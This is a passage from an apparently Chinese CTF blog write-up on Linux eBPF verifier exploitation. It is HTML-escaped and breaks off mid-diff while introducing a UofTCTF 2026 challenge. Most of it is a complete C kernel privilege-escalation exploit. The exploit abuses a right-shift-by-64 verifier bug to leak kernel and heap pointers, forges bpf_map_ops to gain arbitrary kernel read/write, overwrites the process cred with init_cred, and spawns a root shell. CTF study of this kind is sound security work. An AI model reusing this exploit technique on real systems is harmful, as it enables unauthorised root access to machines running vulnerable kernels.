0),&lt;/code&gt;，根据接收到的数据是0还是1决定调用&lt;code&gt;arb_read&lt;/code&gt;还是&lt;code&gt;arb_write&lt;/code&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;arb_read&lt;/code&gt;时：通过&lt;code&gt;arb_read&lt;/code&gt;把要读的东西的地址写到&lt;code&gt;arb_read_write_map&lt;/code&gt;中，再把这个地址写入&lt;code&gt;info_map&lt;/code&gt;，通过&lt;code&gt;bpf_map_lookup_elem&lt;/code&gt;（实际上执行的是&lt;code&gt;ARRAY_MAP_LOOKUP_ELEM&lt;/code&gt;，会进行两次解引用）读这个地址中的内容，并返回&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;arb_write&lt;/code&gt;时：在&lt;code&gt;arb_read_write_map&lt;/code&gt;中写入存储&lt;code&gt;addr&lt;/code&gt;的地址，&lt;code&gt;info_map&lt;/code&gt;中写入存储值的地址，把&lt;code&gt;info_map&lt;/code&gt;的值存入&lt;code&gt;arb_read_write_map&lt;/code&gt;，通过&lt;code&gt;BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_7, 0)&lt;/code&gt;执行&lt;code&gt;*addr(r8) = value(r7)&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;pre&gt;&lt;code&gt;    struct bpf_insn arb_read_write[] = {&#xD;&#xA;        BPF_MOV64_REG(BPF_REG_6, BPF_REG_1),&#xD;&#xA;        BPF_MOV64_IMM(BPF_REG_0, 0),&#xD;&#xA;        BPF_STX_MEM(BPF_W, BPF_REG_10, 0, -4),&#xD;&#xA;&#xD;&#xA;        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),&#xD;&#xA;        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),&#xD;&#xA;        BPF_LD_MAP_FD(BPF_REG_1, arb_read_write_map_fd),&#xD;&#xA;        BPF_CALL_FUNC(BPF_FUNC_map_lookup_elem), // will use array_of_map_gen_lookup&#xD;&#xA;&#xD;&#xA;        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),&#xD;&#xA;        BPF_EXIT_INSN(),&#xD;&#xA;&#xD;&#xA;        BPF_MOV64_REG(BPF_REG_8, BPF_REG_0),&#xD;&#xA;&#xD;&#xA;        BPF_LD_ABS(BPF_B, 0),&#xD;&#xA;        BPF_MOV64_REG(BPF_REG_9, BPF_REG_0), // decide bit for arb_read or arb_write&#xD;&#xA;&#xD;&#xA;        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),&#xD;&#xA;        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),&#xD;&#xA;        BPF_LD_MAP_FD(BPF_REG_1, info_map_fd),&#xD;&#xA;        BPF_CALL_FUNC(BPF_FUNC_map_lookup_elem),&#xD;&#xA;&#xD;&#xA;        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),&#xD;&#xA;        BPF_EXIT_INSN(),&#xD;&#xA;&#xD;&#xA;        BPF_JMP_IMM(BPF_JEQ, BPF_REG_9, 1, 4),&#xD;&#xA;&#xD;&#xA;        BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, 0), // arb_read&#xD;&#xA;        BPF_STX_MEM(BPF_DW, BPF_REG_0, BPF_REG_7, 0),&#xD;&#xA;&#xD;&#xA;        BPF_MOV64_IMM(BPF_REG_0, 0),&#xD;&#xA;        BPF_EXIT_INSN(),&#xD;&#xA;&#xD;&#xA;        BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 0), // arb_write&#xD;&#xA;        BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_7, 0),&#xD;&#xA;&#xD;&#xA;        BPF_MOV64_IMM(BPF_REG_0, 0),&#xD;&#xA;        BPF_EXIT_INSN(),&#xD;&#xA;    };&#xD;&#xA;&#xD;&#xA;    setup_bpf_prog(arb_read_write, sizeof(arb_read_write)/sizeof(arb_read_write[0]));&#xD;&#xA;&#xD;&#xA;    uint64_t current_task_struct = arb_read(arb_read(__per_cpu_offset) &amp;#43; current_task);&#xD;&#xA;    uint64_t init_cred = kbase &amp;#43; INIT_CRED_OFFSET;&#xD;&#xA;&#xD;&#xA;    arb_write(current_task_struct &amp;#43; CRED_OFFSET, init_cred);&#xD;&#xA;&#xD;&#xA;    system(&amp;#34;/bin/sh&amp;#34;);&lt;/code&gt;&lt;/pre&gt;&lt;h5 class=&#34;heading-element&#34; id=&#34;exp&#34;&gt;&lt;span&gt;exp&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#exp&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h5&gt;&lt;pre&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;&#xD;&#xA;#include &amp;lt;stdint.h&amp;gt;&#xD;&#xA;#include &amp;lt;stdlib.h&amp;gt;&#xD;&#xA;#include &amp;lt;string.h&amp;gt;&#xD;&#xA;#include &amp;lt;unistd.h&amp;gt;&#xD;&#xA;#include &amp;lt;syscall.h&amp;gt;&#xD;&#xA;#include &amp;lt;linux/bpf.h&amp;gt;&#xD;&#xA;#include &amp;lt;sys/socket.h&amp;gt;&#xD;&#xA;#include &amp;#34;bpf_insn.h&amp;#34;&#xD;&#xA;&#xD;&#xA;#define ARRAY_MAP_OPS_OFFSET 0x10363a0&#xD;&#xA;#define ARRAY_MAP_LOOKUP_ELEM_OFFSET 0x20e830&#xD;&#xA;#define ARRAY_MAP_UPDATE_ELEM_OFFSET 0x20eeb0&#xD;&#xA;#define PERCPU_OFFSET 0x149c900&#xD;&#xA;#define current_task 0x17bc0&#xD;&#xA;#define INIT_CRED_OFFSET 0x1a6b880&#xD;&#xA;#define CRED_OFFSET 0xad8&#xD;&#xA;&#xD;&#xA;int socks[2] = {-1};&#xD;&#xA;int oob_map_fd, arb_read_write_map_fd, info_map_fd;&#xD;&#xA;&#xD;&#xA;int bpf(int cmd, union bpf_attr *attr){&#xD;&#xA;    return syscall(__NR_bpf, cmd, attr, sizeof(*attr));&#xD;&#xA;}&#xD;&#xA;&#xD;&#xA;int bpf_prog_load(union bpf_attr *attr){&#xD;&#xA;    return bpf(BPF_PROG_LOAD, attr);&#xD;&#xA;}&#xD;&#xA;&#xD;&#xA;int bpf_map_create(uint32_t key_size, uint32_t value_size, uint32_t max_entries){&#xD;&#xA;    union bpf_attr attr = {&#xD;&#xA;        .map_type = BPF_MAP_TYPE_ARRAY,&#xD;&#xA;        .key_size = key_size,&#xD;&#xA;        .value_size = value_size,&#xD;&#xA;        .max_entries = max_entries&#xD;&#xA;    };&#xD;&#xA;&#xD;&#xA;    return bpf(BPF_MAP_CREATE, &amp;amp;attr);&#xD;&#xA;}&#xD;&#xA;&#xD;&#xA;int bpf_map_update_elem(int map_fd, uint64_t key, uint64_t* value, uint64_t flags){&#xD;&#xA;    union bpf_attr attr = {&#xD;&#xA;        .map_fd = map_fd,&#xD;&#xA;        .key = (uint64_t) &amp;amp;key,&#xD;&#xA;        .value = (uint64_t) value,&#xD;&#xA;        .flags = flags&#xD;&#xA;    };&#xD;&#xA;&#xD;&#xA;    return bpf(BPF_MAP_UPDATE_ELEM, &amp;amp;attr);&#xD;&#xA;}&#xD;&#xA;&#xD;&#xA;uint64_t bpf_map_lookup_elem(int map_fd, uint32_t key, int index){&#xD;&#xA;    uint64_t value[0x150/8] = {};&#xD;&#xA;&#xD;&#xA;    union bpf_attr attr = {&#xD;&#xA;        .map_fd = map_fd,&#xD;&#xA;        .key = (uint64_t) &amp;amp;key,&#xD;&#xA;        .value = (uint64_t) &amp;amp;value,&#xD;&#xA;    };&#xD;&#xA;&#xD;&#xA;    bpf(BPF_MAP_LOOKUP_ELEM, &amp;amp;attr);&#xD;&#xA;    return value[index];&#xD;&#xA;}&#xD;&#xA;&#xD;&#xA;union bpf_attr* create_bpf_prog(struct bpf_insn *insns, unsigned int insn_cnt){&#xD;&#xA;    union bpf_attr *attr = (union bpf_attr *) malloc(sizeof(union bpf_attr));&#xD;&#xA;&#xD;&#xA;    attr-&amp;gt;prog_type = BPF_PROG_TYPE_SOCKET_FILTER;&#xD;&#xA;    attr-&amp;gt;insn_cnt = insn_cnt;&#xD;&#xA;    attr-&amp;gt;insns = (uint64_t) insns;&#xD;&#xA;    attr-&amp;gt;license = (uint64_t)&amp;#34;&amp;#34;;&#xD;&#xA;&#xD;&#xA;    return attr;&#xD;&#xA;}&#xD;&#xA;&#xD;&#xA;uint64_t arb_read(uint64_t addr){&#xD;&#xA;    int req = 0;&#xD;&#xA;&#xD;&#xA;    bpf_map_update_elem(arb_read_write_map_fd, 0, &amp;amp;addr, BPF_ANY);&#xD;&#xA;&#xD;&#xA;    write(socks[1], &amp;amp;req, sizeof(req));&#xD;&#xA;&#xD;&#xA;    return bpf_map_lookup_elem(info_map_fd, 0, 0);&#xD;&#xA;}&#xD;&#xA;&#xD;&#xA;int arb_write(uint64_t addr, uint64_t val){&#xD;&#xA;    int req = 1;&#xD;&#xA;&#xD;&#xA;    bpf_map_update_elem(arb_read_write_map_fd, 0, &amp;amp;addr, BPF_ANY);&#xD;&#xA;    bpf_map_update_elem(info_map_fd, 0, &amp;amp;val, BPF_ANY);&#xD;&#xA;&#xD;&#xA;    write(socks[1], &amp;amp;req, sizeof(req));&#xD;&#xA;&#xD;&#xA;    return bpf_map_lookup_elem(info_map_fd, 0, 0) == val;&#xD;&#xA;}&#xD;&#xA;&#xD;&#xA;int attach_socket(int prog_fd){&#xD;&#xA;    if(socks[0] == -1 &amp;amp;&amp;amp; socketpair(AF_UNIX, SOCK_DGRAM, 0, socks) &amp;lt; 0){&#xD;&#xA;        perror(&amp;#34;socketpair&amp;#34;);&#xD;&#xA;        exit(1);&#xD;&#xA;    }&#xD;&#xA;    &#xD;&#xA;    if(setsockopt(socks[0], SOL_SOCKET, SO_ATTACH_BPF, &amp;amp;prog_fd, sizeof(prog_fd)) &amp;lt; 0){&#xD;&#xA;        perror(&amp;#34;setsockopt&amp;#34;);&#xD;&#xA;        exit(1);&#xD;&#xA;    }&#xD;&#xA;}&#xD;&#xA;&#xD;&#xA;void setup_bpf_prog(struct bpf_insn *insns, uint insncnt){&#xD;&#xA;    union bpf_attr *prog = create_bpf_prog(insns, insncnt);&#xD;&#xA;    int prog_fd = bpf_prog_load(prog);&#xD;&#xA;&#xD;&#xA;    if(prog_fd &amp;lt; 0){&#xD;&#xA;        perror(&amp;#34;prog_load&amp;#34;);&#xD;&#xA;        exit(1);&#xD;&#xA;    }&#xD;&#xA;&#xD;&#xA;    attach_socket(prog_fd);&#xD;&#xA;}&#xD;&#xA;// void setup_bpf_prog(struct bpf_insn *insns, uint insncnt) {&#xD;&#xA;//     // 1. 定义一个足够大的缓冲区来存放内核日志&#xD;&#xA;//     static char log_buf[1024 * 1024]; &#xD;&#xA;    &#xD;&#xA;//     union bpf_attr *prog = create_bpf_prog(insns, insncnt);&#xD;&#xA;    &#xD;&#xA;//     // 2. 注入日志参数&#xD;&#xA;//     prog-&amp;gt;log_level = 2;           // 级别 2 会显示指令重写 (Patching) 详情&#xD;&#xA;//     prog-&amp;gt;log_buf = (uint64_t)log_buf;&#xD;&#xA;//     prog-&amp;gt;log_size = sizeof(log_buf);&#xD;&#xA;&#xD;&#xA;//     int prog_fd = bpf_prog_load(prog);&#xD;&#xA;&#xD;&#xA;//     // 3. 打印日志&#xD;&#xA;//     // 无论成功还是失败，打印 log_buf 都能看到 Verifier 做了什么&#xD;&#xA;//     if (prog_fd &amp;lt; 0) {&#xD;&#xA;//         printf(&amp;#34;--- Verifier Log (Error) ---\n%s\n&amp;#34;, log_buf);&#xD;&#xA;//         perror(&amp;#34;prog_load&amp;#34;);&#xD;&#xA;//         exit(1);&#xD;&#xA;//     } else {&#xD;&#xA;//         // 如果你想看成功加载后的指令（包含 ALU Sanitation），也打印出来&#xD;&#xA;//         printf(&amp;#34;--- Verifier Log (Success) ---\n%s\n&amp;#34;, log_buf);&#xD;&#xA;//     }&#xD;&#xA;&#xD;&#xA;//     attach_socket(prog_fd);&#xD;&#xA;//     free(prog); // 记得释放 malloc 的内存&#xD;&#xA;// }&#xD;&#xA;void run_bpf_prog(struct bpf_insn *insns, uint insncnt){&#xD;&#xA;    int val = 0;&#xD;&#xA;&#xD;&#xA;    setup_bpf_prog(insns, insncnt);&#xD;&#xA;    write(socks[1], &amp;amp;val, sizeof(val));&#xD;&#xA;}&#xD;&#xA;&#xD;&#xA;int main(){&#xD;&#xA;    uint64_t idx = 0;&#xD;&#xA;    struct bpf_map_info map_info = {};&#xD;&#xA;&#xD;&#xA;    oob_map_fd = bpf_map_create(4, 0x150, 1);&#xD;&#xA;    arb_read_write_map_fd = bpf_map_create(4, 8, 1);&#xD;&#xA;    info_map_fd = bpf_map_create(4, 8, 1);&#xD;&#xA;&#xD;&#xA;    if(oob_map_fd &amp;lt; 0){&#xD;&#xA;        perror(&amp;#34;create_map&amp;#34;);&#xD;&#xA;        return 1;&#xD;&#xA;    }&#xD;&#xA;&#xD;&#xA;    struct bpf_insn kleak_prog[] = {&#xD;&#xA;        // load map_ptr_or_null in BPF_REG_0&#xD;&#xA;        BPF_MOV64_IMM(BPF_REG_0, 0),&#xD;&#xA;        BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, -4),&#xD;&#xA;        BPF_MOV64_REG(BPF_REG_6, BPF_REG_1),&#xD;&#xA;        BPF_LD_MAP_FD(BPF_REG_1, oob_map_fd),&#xD;&#xA;        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),&#xD;&#xA;        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),&#xD;&#xA;        BPF_CALL_FUNC(BPF_FUNC_map_lookup_elem), // returns map_ptr &amp;#43; 0x110 (offset of .values in array_map)&#xD;&#xA;        &#xD;&#xA;        // map_ptr_or_null -&amp;gt; map_ptr&#xD;&#xA;        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),&#xD;&#xA;        BPF_EXIT_INSN(),&#xD;&#xA;&#xD;&#xA;        // trigger vuln and make eBPF think we are still map_ptr &amp;#43; 0x110 but in reality we&amp;#39;re map_ptr &amp;#43; 0x0&#xD;&#xA;        BPF_MOV64_REG(BPF_REG_7, BPF_REG_0),&#xD;&#xA;        // ALU Sanitation will set alu_limit = 0 but alu_limit - 1 will be used hence any value can be used&#xD;&#xA;        BPF_MOV64_IMM(BPF_REG_0, 0x110),&#xD;&#xA;        BPF_MOV64_IMM(BPF_REG_1, 64),&#xD;&#xA;        BPF_ALU64_REG(BPF_RSH, BPF_REG_0, BPF_REG_1), // the bug&#xD;&#xA;        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_0),&#xD;&#xA;        BPF_LDX_MEM(BPF_DW, BPF_REG_8, BPF_REG_7, 0), // load the ptr (kbase leak)&#xD;&#xA;&#xD;&#xA;        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 0xc0), // map_ptr &amp;#43; 0x0 -&amp;gt; map_ptr &amp;#43; 0xc0&#xD;&#xA;        BPF_LDX_MEM(BPF_DW, BPF_REG_9, BPF_REG_7, 0), // load the ptr (heap leak)&#xD;&#xA;&#xD;&#xA;        // write the read ptr to map for reading it from userspace&#xD;&#xA;        BPF_ALU64_IMM(BPF_ADD, BPF_REG_7, 0x50), // make map_ptr &amp;#43; 0xc0 to map_ptr &amp;#43; 0x110&#xD;&#xA;        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, 0), // write array_map_ops ptr to maps_ptr &amp;#43; 0x110&#xD;&#xA;        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_9, 8), // write *(map_ptr &amp;#43; 0xc0) to maps_ptr &amp;#43; 0x118&#xD;&#xA;        BPF_EXIT_INSN(),&#xD;&#xA;    };&#xD;&#xA;&#xD;&#xA;    run_bpf_prog(kleak_prog, sizeof(kleak_prog)/sizeof(kleak_prog[0]));&#xD;&#xA;&#xD;&#xA;    uint64_t array_map_ops = bpf_map_lookup_elem(oob_map_fd, 0, 0);&#xD;&#xA;    uint64_t map_ptr = bpf_map_lookup_elem(oob_map_fd, 0, 1) - 0xc0;&#xD;&#xA;    uint64_t map_ptr_values = map_ptr &amp;#43; 0x110;&#xD;&#xA;    uint64_t kbase = array_map_ops - ARRAY_MAP_OPS_OFFSET;&#xD;&#xA;    uint64_t __per_cpu_offset = kbase &amp;#43; PERCPU_OFFSET;&#xD;&#xA;&#xD;&#xA;    printf(&amp;#34;array_map_ops: %p\nkbase: %p\nmap_ptr: %p\n&amp;#34;, (void *)array_map_ops, (void *)kbase, (void *)map_ptr);&#xD;&#xA;&#xD;&#xA;    struct bpf_insn overwrite_ops[] = {&#xD;&#xA;        BPF_MOV64_REG(BPF_REG_6, BPF_REG_1),&#xD;&#xA;        BPF_MOV64_IMM(BPF_REG_0, 0),&#xD;&#xA;        BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, -4),&#xD;&#xA;        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),&#xD;&#xA;        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),&#xD;&#xA;        BPF_LD_MAP_FD(BPF_REG_1, oob_map_fd),&#xD;&#xA;        BPF_CALL_FUNC(BPF_FUNC_map_lookup_elem),&#xD;&#xA;&#xD;&#xA;        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),&#xD;&#xA;        BPF_EXIT_INSN(),&#xD;&#xA;&#xD;&#xA;        // setup fake bpf_map_ops struct with only needed values&#xD;&#xA;        BPF_MOV64_REG(BPF_REG_7, BPF_REG_0), // move map_ptr &amp;#43; 0x110&#xD;&#xA;        BPF_MOV64_IMM(BPF_REG_0, kbase &amp;#43; ARRAY_MAP_UPDATE_ELEM_OFFSET),&#xD;&#xA;        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 0x60),&#xD;&#xA;&#xD;&#xA;        BPF_MOV64_IMM(BPF_REG_0, kbase &amp;#43; ARRAY_MAP_LOOKUP_ELEM_OFFSET),&#xD;&#xA;        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 0x58),&#xD;&#xA;&#xD;&#xA;        BPF_MOV64_IMM(BPF_REG_0, kbase &amp;#43; 0x20e9c0), // array_of_map_gen_lookup&#xD;&#xA;        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 19 * 8),&#xD;&#xA;&#xD;&#xA;        BPF_MOV64_IMM(BPF_REG_0, kbase &amp;#43; 0x20eff0), // array_map_free&#xD;&#xA;        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 3 * 8),&#xD;&#xA;&#xD;&#xA;        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),&#xD;&#xA;        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),&#xD;&#xA;        BPF_LD_MAP_FD(BPF_REG_1, arb_read_write_map_fd),&#xD;&#xA;        BPF_CALL_FUNC(BPF_FUNC_map_lookup_elem), // get values ptr&#xD;&#xA;&#xD;&#xA;        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),&#xD;&#xA;        BPF_EXIT_INSN(),&#xD;&#xA;&#xD;&#xA;        BPF_MOV64_REG(BPF_REG_7, BPF_REG_0),&#xD;&#xA;&#xD;&#xA;        // trigger vuln&#xD;&#xA;        BPF_MOV64_IMM(BPF_REG_0, 0x110),&#xD;&#xA;        BPF_MOV64_IMM(BPF_REG_1, 64),&#xD;&#xA;        BPF_ALU64_REG(BPF_RSH, BPF_REG_0, BPF_REG_1),&#xD;&#xA;        BPF_ALU64_REG(BPF_SUB, BPF_REG_7, BPF_REG_0),&#xD;&#xA;&#xD;&#xA;        BPF_LD_IMM64(BPF_REG_0, map_ptr_values),&#xD;&#xA;&#xD;&#xA;        // overwrite map_ops with oob_map_ptr&#xD;&#xA;        BPF_STX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 0),&#xD;&#xA;&#xD;&#xA;        BPF_EXIT_INSN(),&#xD;&#xA;    };&#xD;&#xA;&#xD;&#xA;    run_bpf_prog(overwrite_ops, sizeof(overwrite_ops)/sizeof(overwrite_ops[0]));&#xD;&#xA;&#xD;&#xA;    struct bpf_insn arb_read_write[] = {&#xD;&#xA;        BPF_MOV64_REG(BPF_REG_6, BPF_REG_1),&#xD;&#xA;        BPF_MOV64_IMM(BPF_REG_0, 0),&#xD;&#xA;        BPF_STX_MEM(BPF_W, BPF_REG_10, 0, -4),&#xD;&#xA;&#xD;&#xA;        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),&#xD;&#xA;        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),&#xD;&#xA;        BPF_LD_MAP_FD(BPF_REG_1, arb_read_write_map_fd),&#xD;&#xA;        BPF_CALL_FUNC(BPF_FUNC_map_lookup_elem), // will use array_of_map_gen_lookup&#xD;&#xA;&#xD;&#xA;        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),&#xD;&#xA;        BPF_EXIT_INSN(),&#xD;&#xA;&#xD;&#xA;        BPF_MOV64_REG(BPF_REG_8, BPF_REG_0),&#xD;&#xA;&#xD;&#xA;        BPF_LD_ABS(BPF_B, 0),&#xD;&#xA;        BPF_MOV64_REG(BPF_REG_9, BPF_REG_0), // decide bit for arb_read or arb_write&#xD;&#xA;&#xD;&#xA;        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),&#xD;&#xA;        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, -4),&#xD;&#xA;        BPF_LD_MAP_FD(BPF_REG_1, info_map_fd),&#xD;&#xA;        BPF_CALL_FUNC(BPF_FUNC_map_lookup_elem),&#xD;&#xA;&#xD;&#xA;        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, 0, 1),&#xD;&#xA;        BPF_EXIT_INSN(),&#xD;&#xA;&#xD;&#xA;        BPF_JMP_IMM(BPF_JEQ, BPF_REG_9, 1, 4),&#xD;&#xA;&#xD;&#xA;        BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_8, 0), // arb_read&#xD;&#xA;        BPF_STX_MEM(BPF_DW, BPF_REG_0, BPF_REG_7, 0),&#xD;&#xA;&#xD;&#xA;        BPF_MOV64_IMM(BPF_REG_0, 0),&#xD;&#xA;        BPF_EXIT_INSN(),&#xD;&#xA;&#xD;&#xA;        BPF_LDX_MEM(BPF_DW, BPF_REG_7, BPF_REG_0, 0), // arb_write&#xD;&#xA;        BPF_STX_MEM(BPF_DW, BPF_REG_8, BPF_REG_7, 0),&#xD;&#xA;&#xD;&#xA;        BPF_MOV64_IMM(BPF_REG_0, 0),&#xD;&#xA;        BPF_EXIT_INSN(),&#xD;&#xA;    };&#xD;&#xA;&#xD;&#xA;    setup_bpf_prog(arb_read_write, sizeof(arb_read_write)/sizeof(arb_read_write[0]));&#xD;&#xA;&#xD;&#xA;    uint64_t current_task_struct = arb_read(arb_read(__per_cpu_offset) &amp;#43; current_task);&#xD;&#xA;    uint64_t init_cred = kbase &amp;#43; INIT_CRED_OFFSET;&#xD;&#xA;&#xD;&#xA;    arb_write(current_task_struct &amp;#43; CRED_OFFSET, init_cred);&#xD;&#xA;&#xD;&#xA;    system(&amp;#34;/bin/sh&amp;#34;);&#xD;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;d3ctf-2022__d3bpf-v2&#34;&gt;&lt;span&gt;D^3CTF 2022__d3bpf-v2&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#d3ctf-2022__d3bpf-v2&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h4&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;uoftctf-2026----extended-ebpf&#34;&gt;&lt;span&gt;UofTCTF 2026  - &lt;a href=&#34;https://github.com/UofTCTF/uoftctf-2026-chals-public/blob/main/eebpf&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;extended-eBPF&lt;/a&gt;&lt;/span&gt;&#xD;&#xA;  &lt;a href=&#34;#uoftctf-2026----extended-ebpf&#34; class=&#34;heading-mark&#34;&gt;&#xD;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xD;&#xA;  &lt;/a&gt;&#xD;&#xA;&lt;/h4&gt;&lt;p&gt;账号输入ctf即可登录，再&lt;code&gt;cd /&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;内核版本：6.12.47&lt;/p&gt;&#xA;&lt;p&gt;禁掉&lt;code&gt;ALU Sanitation&lt;/code&gt;，&lt;/p&gt;&#xA;&lt;p&gt;在&lt;code&gt;adjust_scalar_min_max_vals&lt;/code&gt;中：&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&#x9;if (!is_safe_to_compute_dst_reg_range(insn, &amp;amp;src_reg)) {&#xD;&#xA;&#x9;&#x9;__mark_reg_unknown(env, dst_reg);&#xD;&#xA;&#x9;&#x9;return 0;&#xD;&#xA;&#x9;}&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;diff --git a/kernel/bpf/verifier.c b/kernel/bpf/verifier.c&#xD;&#xA;index 24ae8f33e5d7..e5641845ecc0 100644&#xD;&#xA;--- a/kernel/bpf/verifier.c&#xD;&#xA;&amp;#43;&amp;#43;&amp;#43; b/kernel/bpf/verifier.c&#xD;&#xA;@@ -13030,7 &amp;#43;13030,7 @@ static int retrieve_ptr_limit(const struct bpf_reg_state *ptr_reg,&#xD;&#xA; static bool can_skip_alu_sanitation(const struct bpf_verifier_env *env,&#xD;&#xA; &#x9;&#x9;&#x9;&#x9;    const struct bpf_insn *insn)&#xD;&#xA; {&#xD;&#xA;-&#x9;return env-&amp;gt;bypass_spec_v1 || BPF_SRC(insn-&amp;gt;code) == BPF_K;&#xD;&#xA;&amp;#43;&#x9;return true;&#xD;&#xA; }&#xD;&#xA; &#xD;&#xA; static int update_alu_sanitation_state(struct bpf_insn_aux_data *aux,&#xD;&#xA;@@ -14108,7 &amp;#43;14108,7 @@ static bool is_safe_to_compute_dst_reg_range(struct bpf_insn *insn,&#xD;&#xA; &#x9;case BPF_LSH:&#xD;&#xA; &#x9;case BPF_RSH:&#xD;&#xA; &#x9;case 